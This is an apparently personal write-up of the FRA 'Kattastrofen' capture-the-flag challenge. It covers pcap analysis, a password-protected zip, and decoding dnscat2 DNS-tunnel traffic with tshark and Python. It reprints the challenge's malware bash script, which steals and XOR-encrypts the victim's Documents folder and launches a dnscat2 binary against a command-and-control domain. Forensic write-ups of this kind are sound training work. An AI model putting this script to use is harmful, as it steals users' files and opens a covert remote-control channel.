+++
title = "FRA Kattastrofen"
date = "2026-02-15T18:08:42+01:00"
#dateFormat = "2006-01-02" # This value can be configured for per-post date formatting

description = "My writeup for FRA:s Kattastrofen challange"
showFullContent = false

+++
>En statstjänsteman på en skyddsvärd myndighet är svag för bilder på kattungar.
>I sin iver att ta del av fler sådana bilder, har hen råkat ladda ned något som
>inte var bra. Inte alls bra. Vi misstänker att skadlig kod har använts för att
>exfiltrera topphemlig data från myndigheten. Analysera nätverkstrafiken för att
>ta reda på vad som har hänt.
>
>Utmaningen innehåller tre flaggor på formen /flagga[1-3]{[a-zå-ö0-9_!]+}/ - kan
>du hitta dem?
>
>Skicka in din lösning till rekrytering@fra.se, även om du inte lyckas hitta
samtliga flaggor!
# First flag
The first flag was found by the hint given in the description. A public servent had downloaded some malware he though was picutures of cats. So I decided to take a look in wireshark of the downloaded files. 
![The downloaded files](/FRA_Kattastrofen/malwaredownloade.png)
As can be seen in the picture the zip file looks suspicious. So I downloaded it and discovered it was password protected. Now my first instinct was to use `John The Ripper` so I started trying to get `Zip2John` setup on my sift machine but I had to clone some github stuff and it started complaining about missing libraries and bla bla. So I took the lazy way out and tried just search for frames that contained the string `pass`and lo and behold it worked.
![Found zip password](/FRA_Kattastrofen/zippassword.png)
Inside a file named flag contained the flag `flagga1{klassiska_lösenord_för_100}`.
# Second Flag
What I noticed aswell after extracting the zip file was that every picture had a thumbnail except number 3. This feels suspicious. Using the terminal to view the file with the `ls` command also reveals that it is an executable. lets use the `file` command to see what it actually is. 
![suspicious kitten png in terminal](/FRA_Kattastrofen/suspiciouskittenimage.png)
Aha! It is a shell script. This is probably the downloaded malware. Looking at the bash script it seems to include a base64 encoded key aswell as base64 encoded data that is decoded and saved into a file named `mjau`. The file is then made executable with the `chmod +x` command. 

```bash
#!/bin/bash

D=$(dirname "$0")
eog "$D/kitten-9.jpg" &

key="P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU="
echo $key |base64 -d > /tmp/key
tar cf - $HOME/Documents > /tmp/exfil.tar
echo "EXFIL $(date)" > /tmp/exfil.dat
echo "SIZE: $(stat -c%s /tmp/exfil.tar)" >> /tmp/exfil.dat
md5sum /tmp/exfil.tar >> /tmp/exfil.dat
echo "BEGIN DATA" >> /tmp/exfil.dat
paste <(od -An -vtu1 -w1 /tmp/exfil.tar) <(while :; do od -An -vtu1 -w1 /tmp/key; done) \
  | LC_ALL=C awk 'NF!=2{exit}; {printf "%c", xor($1, $2)}' | base64 >> /tmp/exfil.dat
echo "END DATA" >> /tmp/exfil.dat

base64 -d > mjau << 'EOM'
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAgCkAAAAAAABAAAAAAAAAACgrBQAAAAAAAAAAAEAAOAAN
AEAAJgAlAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAbAAAAAAAAoBsAAAAAAAAAEAAA
AAAAAAEAAAAFAAAAACAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAaQBAAAAAAABpAEAAAAAAAAQAAAA
AAAAAQAAAAQAAAAA0AEAAAAAAADQAQAAAAAAANABAAAAAAC4fgAAAAAAALh+AAAAAAAAABAAAAAA
AAABAAAABgAAABBXAgAAAAAAEGcCAAAAAAAQZwIAAAAAAFAMAAAAAAAAAA0AAAAAAAAAEAAAAAAA
AAIAAAAGAAAAaFsCAAAAAABoawIAAAAAAGhrAgAAAAAA8AEAAAAAAADwAQAAAAAAAAgAAAAAAAAA
BAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE
.
.
.
EOM
chmod +x mjau
./mjau cutekittenzz.xyz
```
Decoding that long block of data with `base64 -d < mjauB64 > mjau` gives me an `ELF` file.
Poking around in Ghidra I see alot of references to `dns` and network activity. I dont fully understand how it works but I doubt I have to reverse engineer the entire program. It seems for sure to setup a connection with functions such as `can_i_transmit_yet` and `you_can_transmit_now`. I also saw alot of refernces to `dnscat`. Looking at the `usage` function seemed to confirm that it was a `dnscat2` binary. 
![dnscat2 usage function](/FRA_Kattastrofen/dnscatusage.png).

Looking at the documention for `dnscat2` reveals that it does indeed setup an ecnrypted channel using the DNS protocol. 
> # dnscat2
>This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.

The `dnscat2`was ran with the domain `cutekittenzz.xyz` as the argument for the domain, `./mjau cutekittenzz.xyz`. This seems to align with the `dns` packets being sent immeditely after the malware was downloaded.
![DNS protocol packets being sent after malware was downloaded](/FRA_Kattastrofen/dnsAfterMalwareDownload.png)
Looking at the dns packets we see that `cutekittenzz.xyz`is heavily referenced.
![cutekittenzz.xyz in dns packets](/FRA_Kattastrofen/cutekittenzzIN_DNS.png).
# My understanding of dnscat2 and the bash script.
Truth be told my `bash` skills are not the greatest nor had I ever heard of `dnscat2` before. So the following section is just me explaining my understanding of the script and `dnscat2` after some googling.
## dnscat2
`dnscat2` is a tool used to setup an ecnrypted command-and-control channel using the `dns` protocol. Since most networks allows `dns` traffic, and do not really monitor it, this can be used to establish a remote connection or exfilitrate data. This technique is also known as `dns tunneling` and `dnscat2`is a tool that utilizes that technique. 

So how does `dns tunneling` work? `dns tunneling` work by the malware encoding data in `dns` queries. These queries are designed to be sent to an attacker controlled `dns` server. These queries could look like these specific `dnscat2` queries which is `<encoded_request>.hacker.com` and the type is `MX`, that is `Mail server hostname`.
When `dnscat2` sends out this query, the local `dns` server do no know the `MX` for `<encoded>.hacker.com`. In order to get the `MX` it utilizes the `dns` protocol and asks the `root nameserver` about which servers are reponsible for knowing about the `.com` domains, and the `root nameserver` responds with `ns records` for the `top level domain (TLD) `servers which do know. 
The `TLD` are then in turned queried about which `authoratiative nameservers` know about `hacker.com` and the `authoratiative nameservers` responds with `ns records` about `hacker.com`. 
The final server responsible for answering the query is the `authoritative nameserver` for `hacker.com`. But here is the thing, this server is attacker controlled. The query asks for the `Mail server hostname` record for `<encoded_request>.hacker.com` and the attacker controlled server responds with `<encoded_response>.hacker.com`. This then makes it way back to the malware which decodes the `encoded_response` which could be instructions, acknowledgement or something else it needs. The malware could also just send data and not making requests.

`dnscat2` uses a `SYN`/`FIN` communication system similar to `TCP`, where `SYN` is used to establish a session and `FIN` to end it. The packet structure (the encoded part of the query) for a `SYN` packet is as follows:
1. Packet ID (16 bits)
2. Message Type (8 bits, 0x00)
3. Session ID (16 bits)
4. Initial sequence number (16 bits)
5. Options (16 bits)
6. Something extra if `OPT_NAME is set, I did not look into it.

For a message packet the structure is as follows:
1. Packet ID (16 bits)
2. Message Type (8 bits, 0x01)
3. Session ID (16 bits)
4. Seq (16 bits)
5. Ack (16 bits)
6. The Message data

What this tells me is that the initial 9 bytes of each packet (the encoded part of the query) is for communication and establishing a connection. If I want the message data I extract the packets who has `0x01` as their third byte and furthermore extract the bytes after the inital 9 bytes. 
## The bash script
With some help from google and chatgpt about the weird `paste`, loop part thing syntax this is how I understand the bash script:
```bash
D=$(dirname "$0") #Get directory from where script is running from. 
eog "$D/kitten-9.jpg" & #Open kitten-9.jpg (user pressed kitten 11 so trick him) in Eye of Gnome and continue with the commands below.

key="P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU=" #Key used for simple repeated key xor later. 
echo $key |base64 -d > /tmp/key #decode key and store in a temp key file
tar cf - $HOME/Documents > /tmp/exfil.tar #compress the users documents folder using tar into a exfil.tar file
echo "EXFIL $(date)" > /tmp/exfil.dat #create a exfil.dat file and put the date in the file.
echo "SIZE: $(stat -c%s /tmp/exfil.tar)" >> /tmp/exfil.dat #append the size of the tar file to the exfil.dat.
md5sum /tmp/exfil.tar >> /tmp/exfil.dat #calc the md5 hash of the tar and append to exfil.dat
echo "BEGIN DATA" >> /tmp/exfil.dat #appened a line that says that the data now starts
```
The loop needs it own explanation:
```bash
paste <(od -An -vtu1 -w1 /tmp/exfil.tar) <(while :; do od -An -vtu1 -w1 /tmp/key; done) \
  | LC_ALL=C awk 'NF!=2{exit}; {printf "%c", xor($1, $2)}' | base64 >> /tmp/exfil.dat
echo "END DATA" >> /tmp/exfil.dat
```

`od -An -vtu1 -w1 /tmp/exfil.tar` is used to display the `exfil.tar` file as an octaldump, basically displaying the bytes ocatl. The command arguments used 
- `-An` removes the offset information so only the bytes are shown in octal.
- `-v` includes duplicate values, `-vtu1` includes duplicate values and specifies an output format of an `unsigned decimal` 1 byte at a time. Basically print `0-255 *space* next value between 0-255` and so on.
- `-w1` says to output 1 byte per line.   
This output ends up lookings something along the lines of:
```
 110
 115
  47
  34
  10
  32
  32
```
The same is done for the key file except it is infinitely long because of the while loop.
`<(command)` is something called `process substitution`. It allows processes output to appear as a file name. Instead of `command file1 file2` I could do `command1 <(command2) <(command3)`. Now `command2` and `command3` appears as files that I can use for `command1`. 

What pase `paste` then does is that it "join files horizontally", like this:
```
A
B
C
``` 
AND
```
1
2
3
```
Turns into (notice space)
```
A 1
B 2
C 3
```
The `while` loop never ends but from how I understood it `paste` stops when it can no longer match them like this.

These joined lists are then piped to `awk` which XORs the values, that is `A XOR 1`. The result is encoded into base64 and appeneded to the exfil.dat. I do not know how interesting it is to know exactly all the parameters and such for the `awk`command so I am just gonna skip that part. 

# Back to finding flag 2
Now that I know how everything works (atleast on a high level) I can develop a strategy.
This is my plan:
1. Export the queries sent by the infected system separately using `tshark`.
2. Export the responses recieved from the compromised `authoritative nameserver` seperetly.
3. Write a pythong script that extracts the encoded part. 
4. Remove the 9 first bytes from each message.
5. Decode it from hex to string.
6. Locate the base64 encoded enrypted message and decode it.
7. Apply the key recovered earlier in the same manner it was encrypted.  

## Step 1 and 2
Was done using `tshark -r kattastrofen.pcap -Y "dns&& ip.src==[VICTIM OR ATTACKER]" -T fields -e "dns.qry.name" > [VICTIM OR ATTACKER]`. 
I also noticed that each packet could include multiple encoded sections seperated by a dot. 
## Step 3, 4, 5
I thought I would have to locate the byte that specified that it was a message but it seemed to work fine without doing that. The `dnscat2` data was also not encrypted.

```python
victim = open("victim")
server = open("server")
victim_decoded = open("victimDecoded",'w')
server_decoded = open("serverDecoded",'w')
victim_lines = []
server_lines = []
for line in victim.readlines():
    query_parts = line.split(".")
    removed_domain = [qp for qp in query_parts if qp != "cutekittenzz" and qp != "xyz"]
    for i in range(0,len(removed_domain)):
        try:
            if i == 0:
                decoded = bytes.fromhex(removed_domain[i][18:]).decode('utf-8') #Remove communication parts
                victim_lines.append(decoded)
            else:
                decoded = bytes.fromhex(removed_domain[i]).decode('utf-8')
                victim_lines.append(decoded)
        
        except:
            continue
       
victim_decoded.write(''.join(victim_lines))
victim_decoded.flush()

for line in server.readlines():
    query_parts = line.split(".")
    removed_domain = [qp for qp in query_parts if qp != "cutekittenzz" and qp != "xyz"]
    for i in range(0,len(removed_domain)):
        try:
            if i == 0:
                decoded = bytes.fromhex(removed_domain[i][18:]).decode('utf-8') #Remove communication parts
                server_lines.append(decoded)
            else:
                decoded = bytes.fromhex(removed_domain[i]).decode('utf-8')
                server_lines.append(decoded)
        
        except:
            continue
       
server_decoded.write(''.join(server_lines))
server_decoded.flush()
```
## Step 6 and 7
Using nano I removed everything but the base64:ed parts and decoded it. I created a python script to xor with the the key that I also decoded:
```python
encrypted = open("victimDataEncrypted",'rb').read()
key = open("key",'rb').read()

data = open("data",'wb')

key_index = 0
for byte in encrypted:
    decypted_byte = byte ^ key[key_index]
    data.write(bytes([decypted_byte]))
    data.flush()
    key_index += 1
    key_index = key_index % len(key)
```
Which gave me a file named `data` and using the `file` command i get: `data: POSIX tar archive (GNU)`.
Using `tar -xf data -C extracted/` I find a pdf called `topphemligt.pdf`. Exciting!!!
The pdf contains the flag:
![Flag 2 in a picture of a kitten](/FRA_Kattastrofen/flag2.png)

# Flag 3
¯\_(ツ)_/¯

I am working on it.